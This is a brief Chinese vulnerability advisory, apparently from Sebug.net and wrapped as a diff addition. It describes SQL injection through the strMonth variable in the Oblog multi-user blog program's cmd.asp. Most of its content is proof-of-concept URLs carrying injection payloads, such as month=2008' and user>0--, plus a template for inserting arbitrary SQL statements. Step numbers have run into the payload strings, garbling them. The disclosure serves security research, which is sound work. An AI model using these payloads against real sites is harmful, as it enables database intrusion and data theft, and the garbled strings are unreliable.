@@ -1,0 +1,6 @@
+Oblog多用户博客程序strMonth变量过滤不严导致SQL注入漏洞
+
+测试方法:
+
+@Sebug.net   dis
+本站提供程序(方法)可能带有攻击性,仅供安全研究与教学之用,风险自负!1.http://localhost/oblog/cmd.asp?do= month&month=2008’ and user>0--012. 3.strDay变量从month中获得日期数据，并判断strDay是否为日期数据。所以构造的注射语句为：4. 5.http://localhost/oblog/cmd.asp?do= month&month=2008’(自己的sql语句)--016. 7.执行sql语句采用rst.Open strSql,Conn,1,18. 
